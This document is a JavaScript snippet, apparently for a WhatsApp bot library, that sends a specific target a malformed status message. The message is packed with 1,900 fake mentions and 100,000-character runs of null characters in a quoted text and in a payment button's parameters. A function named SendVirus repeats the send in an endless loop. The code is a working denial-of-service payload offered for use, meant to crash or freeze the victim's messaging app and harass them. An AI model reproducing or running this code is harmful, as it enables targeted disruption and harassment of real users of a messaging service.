async function LocaX(sock, target) {
  const generateLocationMessage = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 21.1266,
          degreesLongitude: -11.8199,
          name: "x",
          url: "https://t.me/XameliaXD",
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 999999,
            isForwarded: true,
            quotedMessage: {
              extendedTextMessage: {
                text: "\u0000".repeat(100000)
              }
            },
            externalAdReply: {
              advertiserName: "whats !",
              title: "your e idiot ?",
              body: "{ x.json }",
              mediaType: 1,
              renderLargerThumbnail: true,
              jpegThumbnail: null,
              sourceUrl: "https://example.com"
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: "{}" + "\u0000".repeat(100000)
            }
          ],
          messageParamsJson: "{}"
        }
      }
    }
  }

  const msg = generateWAMessageFromContent("status@broadcast", generateLocationMessage, {})

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  }, { participant: target })
}

// <<( The Calling Function )>>
async function SendVirus(sock, target) {
  while (true) {
    await LocaX(sock, target)
  }
}